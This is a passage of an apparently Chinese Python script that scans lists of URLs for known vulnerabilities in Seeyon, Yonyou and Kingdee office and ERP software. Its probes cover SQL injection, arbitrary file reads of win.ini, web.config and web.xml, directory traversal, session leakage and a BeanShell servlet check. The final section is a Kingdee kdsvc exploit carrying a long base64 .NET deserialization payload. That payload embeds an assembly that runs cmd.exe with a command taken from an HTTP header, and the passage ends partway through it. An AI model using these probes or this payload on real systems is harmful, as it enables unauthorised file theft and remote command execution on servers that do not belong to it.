                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA webmail.do 任意文件下载 CNVD-2020-62422")
        except:
            pass
        # ⑦、致远OA A6 test.jsp SQL注入漏洞
        seeyon_test_sql_dir = "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())"
        try:
           # 忽略ssl证书验证
            seeyon_test_sql_res = requests.get(url+seeyon_test_sql_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            seeyon_test_sql_res.encoding='utf-8'
            seeyon_test_sql_res_text = seeyon_test_sql_res.text
           
            if seeyon_test_sql_res.status_code == 200 and   'database' in seeyon_test_sql_res_text and 'mysql' in seeyon_test_sql_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+seeyon_test_sql_dir+" "+"存在致远OA A6 test.jsp SQL注入漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA A6 test.jsp SQL注入漏洞")
        except:
            pass
        # ⑧、致远OA ajax.do 任意文件上传 CNVD-2021-01627
        seeyon_ajax_dir = "/seeyon/thirdpartyController.do.css/..;/ajax.do"
        try:
           # 忽略ssl证书验证
            seeyon_ajax_res = requests.get(url+seeyon_ajax_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            seeyon_ajax_res.encoding='utf-8'
            seeyon_ajax_res_text = seeyon_ajax_res.text
           
            if seeyon_ajax_res.status_code == 200 and  'java.lang.NullPointerException:null' in seeyon_ajax_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+seeyon_ajax_dir+" "+"存在致远OA ajax.do 任意文件上传 CNVD-2021-01627")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在致远OA ajax.do 任意文件上传 CNVD-2021-01627")
        except:
            pass

# 用友OA漏洞POC扫描
def yonsuite_vuln_scan():
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    url_list = basic.url_file_ip_list()
    hearder={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
    }
    for url in url_list:
        print("url:"+url)
        # 1、用友 ERP-NC NCFindWeb 目录遍历漏洞
        yonsuite_ncfindweb_dir = "/NCFindWeb?service=IPreAlertConfigService&filename="
        try:
            # 忽略ssl证书验证
            yonsuite_ncfindweb_res = requests.get(url+yonsuite_ncfindweb_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            yonsuite_ncfindweb_res.encoding='utf-8'
            yonsuite_ncfindweb_res_text = yonsuite_ncfindweb_res.text
        
            if yonsuite_ncfindweb_res.status_code == 200 and  'licence.txt' in yonsuite_ncfindweb_res_text and 'Client' in yonsuite_ncfindweb_res_text and 'InstallProperties_zh.properties' in yonsuite_ncfindweb_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+yonsuite_ncfindweb_dir+" "+"存在用友 ERP-NC NCFindWeb 目录遍历漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在用友 ERP-NC NCFindWeb 目录遍历漏洞")
        except:
            pass
    
        # 2、用友 NC NCFindWeb 任意文件读取漏洞
        yonsuite_ncfindweb_file_dir = "/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml"
        try:
            # 忽略ssl证书验证
            yonsuite_ncfindweb_file_res = requests.get(url+yonsuite_ncfindweb_file_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            yonsuite_ncfindweb_file_res.encoding='utf-8'
            yonsuite_ncfindweb_file_res_text = yonsuite_ncfindweb_file_res.text
        
            if yonsuite_ncfindweb_file_res.status_code == 200 and  'web-app' in yonsuite_ncfindweb_file_res_text and 'listener-class' in yonsuite_ncfindweb_file_res_text and 'filter-mapping' in yonsuite_ncfindweb_file_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+yonsuite_ncfindweb_file_dir+" "+"存在用友 NC NCFindWeb 任意文件读取漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在用友 NC NCFindWeb 任意文件读取漏洞")
        except:
            pass
    
        # 3、用友 NC bsh.servlet.BshServlet 远程命令执行漏洞
        yonsuite_bashservlet_dir = "/servlet/~ic/bsh.servlet.BshServlet"
        try:
            # 忽略ssl证书验证
            yonsuite_bashservlet_res = requests.get(url+yonsuite_bashservlet_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            yonsuite_bashservlet_res.encoding='utf-8'
            yonsuite_bashservlet_res_text = yonsuite_bashservlet_res.text
        
            if yonsuite_bashservlet_res.status_code == 200 and  'BeanShell' in yonsuite_bashservlet_res_text and 'Script' in yonsuite_bashservlet_res_text and 'Display' in yonsuite_bashservlet_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+yonsuite_bashservlet_dir+" "+"存在用友 NC bsh.servlet.BshServlet 远程命令执行漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在用友 NC bsh.servlet.BshServlet 远程命令执行漏洞")
        except:
            pass

        # 4、用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞
        yonsuite_getSessionList_dir = "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
        try:
            # 忽略ssl证书验证
            yonsuite_getSessionList_res = requests.get(url+yonsuite_getSessionList_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            yonsuite_getSessionList_res.encoding='utf-8'
            yonsuite_getSessionList_res_text = yonsuite_getSessionList_res.text
            # 正则表达式模式
            pattern = r'[A-Z0-9]{32}'
            result = re.findall(pattern,yonsuite_getSessionList_res_text)
            # 返回包返回姓名和32位大写字母+数字组合，正则返回列表
            result_len = len(result)
        
            if yonsuite_getSessionList_res.status_code == 200 and  'SessionList' in yonsuite_getSessionList_res_text and 'Session' in yonsuite_getSessionList_res_text and 'usrID' in yonsuite_getSessionList_res_text and result_len >= 1:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+yonsuite_getSessionList_dir+" "+"存在用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞")
        except:
            pass
        # 5、用友 U8 OA test.jsp SQL注入漏洞
        yonsuite_testsql_dir = "/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))"
        try:
            # 忽略ssl证书验证
            yonsuite_testsql_res = requests.get(url+yonsuite_testsql_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            yonsuite_testsql_res.encoding='utf-8'
            yonsuite_testsql_res_text = yonsuite_testsql_res.text
            
            if yonsuite_testsql_res.status_code == 200 and  'MD5' in yonsuite_testsql_res_text and 'c4ca4238a0b923820dcc509a6f75849b' in yonsuite_testsql_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+yonsuite_testsql_dir+" "+"存在用友 U8 OA test.jsp SQL注入漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在用友 U8 OA test.jsp SQL注入漏洞")
        except:
            pass


# 金蝶OA漏洞扫描
def kingdeeoa_vuln_scan():
    # 获取当前时间
    now = datetime.now()
    # 格式化时间，只保留时、分、秒
    formatted_time = now.strftime("%H:%M:%S")
    url_list = basic.url_file_ip_list()
    hearder={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
    }
    
    for url in url_list:
        print("url:"+url)
        # 1、金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞
        kinddeeoa_server_file_dir = "/admin/protected/selector/server_file/files?folder=/"
        try:
            # 忽略ssl证书验证
            kinddeeoa_server_file_res = requests.get(url+kinddeeoa_server_file_dir,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            kinddeeoa_server_file_res.encoding='utf-8'
            kinddeeoa_server_file_res_text = kinddeeoa_server_file_res.text
            
            if kinddeeoa_server_file_res.status_code == 200 and  'name' in kinddeeoa_server_file_res_text and 'path' in kinddeeoa_server_file_res_text and 'folder' in kinddeeoa_server_file_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+kinddeeoa_server_file_dir+" "+"存在金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞")
        except:
            pass
    
        # 2、金蝶OA 云星空 CommonFileServer 任意文件读取漏洞
        kinddeeoa_CommonFileServer_file_dir1 = "/CommonFileServer/c%3a%2fwindows%2fwin.ini"
        kinddeeoa_CommonFileServer_file_dir2 = "/CommonFileServer/C%3A%5CProgram%20Files%20%28x86%29%5CKingdee%5CK3Cloud%5CWebSite%5CWeb.config"
        try:
            # 忽略ssl证书验证
            # 路径一
            kinddeeoa_CommonFileServer_file1_res = requests.get(url+kinddeeoa_CommonFileServer_file_dir1,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            kinddeeoa_CommonFileServer_file1_res.encoding='utf-8'
            kinddeeoa_CommonFileServer_file1_res_text = kinddeeoa_CommonFileServer_file1_res.text
            # 路径二
            kinddeeoa_CommonFileServer_file2_res = requests.get(url+kinddeeoa_CommonFileServer_file_dir2,headers=hearder,allow_redirects=False,timeout=custom_poc_timeout,verify=False)
            kinddeeoa_CommonFileServer_file2_res.encoding='utf-8'
            kinddeeoa_CommonFileServer_file2_res_text = kinddeeoa_CommonFileServer_file2_res.text
            # 返回包特征判断漏洞是否存在
            if kinddeeoa_CommonFileServer_file1_res.status_code == 200 and  '[fonts]' in kinddeeoa_CommonFileServer_file1_res_text and '[extensions]' in kinddeeoa_CommonFileServer_file1_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+kinddeeoa_CommonFileServer_file_dir1+" "+"存在金蝶OA 云星空 CommonFileServer 任意文件读取漏洞")
            elif kinddeeoa_CommonFileServer_file2_res.status_code == 200 and  'Kingdee.BOS.Web.ImageHanlder,Kingdee.BOS.Web' in kinddeeoa_CommonFileServer_file2_res_text and 'profiles' in kinddeeoa_CommonFileServer_file2_res_text and 'configuration' in kinddeeoa_CommonFileServer_file2_res_text:
                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+kinddeeoa_CommonFileServer_file_dir2+" "+"存在金蝶OA 云星空 CommonFileServer 任意文件读取漏洞")
            else:
                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+" "+"不存在金蝶OA Apusic应用服务器(中间件) server_file 目录遍历漏洞")
        except:
            pass

        # 3、金蝶OA 云星空 kdsvc 远程命令执行漏洞
        kinddeeoa_kdsvc_dir = "/Kingdee.BOS.ServiceFacade.ServicesStub.DevReportService.GetBusinessObjectData.common.kdsvc"
        data = {"ap0":"AAEAAAD/////AQAAAAAAAAAMAgAAAFdTeXN0ZW0uV2luZG93cy5Gb3JtcywgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAACFTeXN0ZW0uV2luZG93cy5Gb3Jtcy5BeEhvc3QrU3RhdGUBAAAAEVByb3BlcnR5QmFnQmluYXJ5BwICAAAACQMAAAAPAwAAAMctAAACAAEAAAD/////AQAAAAAAAAAEAQAAAH9TeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0YDFbW1N5c3RlbS5PYmplY3QsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dAwAAAAZfaXRlbXMFX3NpemUIX3ZlcnNpb24FAAAICAkCAAAACgAAAAoAAAAQAgAAABAAAAAJAwAAAAkEAAAACQUAAAAJBgAAAAkHAAAACQgAAAAJCQAAAAkKAAAACQsAAAAJDAAAAA0GBwMAAAABAQAAAAEAAAAHAgkNAAAADA4AAABhU3lzdGVtLldvcmtmbG93LkNvbXBvbmVudE1vZGVsLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQUEAAAAalN5c3RlbS5Xb3JrZmxvdy5Db21wb25lbnRNb2RlbC5TZXJpYWxpemF0aW9uLkFjdGl2aXR5U3Vycm9nYXRlU2VsZWN0b3IrT2JqZWN0U3Vycm9nYXRlK09iamVjdFNlcmlhbGl6ZWRSZWYCAAAABHR5cGULbWVtYmVyRGF0YXMDBR9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyDgAAAAkPAAAACRAAAAABBQAAAAQAAAAJEQAAAAkSAAAAAQYAAAAEAAAACRMAAAAJFAAAAAEHAAAABAAAAAkVAAAACRYAAAABCAAAAAQAAAAJFwAAAAkYAAAAAQkAAAAEAAAACRkAAAAJGgAAAAEKAAAABAAAAAkbAAAACRwAAAABCwAAAAQAAAAJHQAAAAkeAAAABAwAAAAcU3lzdGVtLkNv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b2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHksIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAYiAAAATlN5c3RlbS5Db3JlLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4ORAQAAAABwAAAAkDAAAACgkkAAAACggIAAAAAAoICAEAAAABEQAAAA8AAAAGJQAAAPUCU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmFibGVgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABASAAAABwAAAAkEAAAACgkoAAAACggIAAAAAAoICAEAAAABEwAAAA8AAAAGKQAAAN8DU3lzdGVtLkxpbnEuRW51bWVyYWJsZStXaGVyZVNlbGVjdEVudW1lcmFibGVJdGVyYXRvcmAyW1tTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5JRW51bWVyYWJsZWAxW1tTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0sIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV0sW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLklFbnVtZXJhdG9yYDFbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFAAAAAcAAAAJBQAAAAoJLAAAAAoICAAAAAAKCAgBAAAAARUAAAAPAAAABi0AAADmAlN5c3RlbS5MaW5xLkVudW1lcmFibGUrV2hlcmVTZWxlY3RFbnVtZXJhYmxlSXRlcmF0b3JgMltbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuSUVudW1lcmF0b3JgMVtbU3lzdGVtLlR5cGUsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uVHlwZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0EAAAACSIAAAAQFgAAAAcAAAAJBgAAAAkwAAAACTEAAAAKCAgAAAAACggIAQAAAAEXAAAADwAAAAYyAAAA7wFTeXN0ZW0uTGlucS5FbnVtZXJhYmxlK1doZXJlU2VsZWN0RW51bWVyYWJsZUl0ZXJhdG9yYDJbW1N5c3RlbS5UeXBlLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uT2JqZWN0LCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAJIgAAABAYAAAABwAAAAkHAAAACgk1AAAACggIAAAAAAoICAEAAAA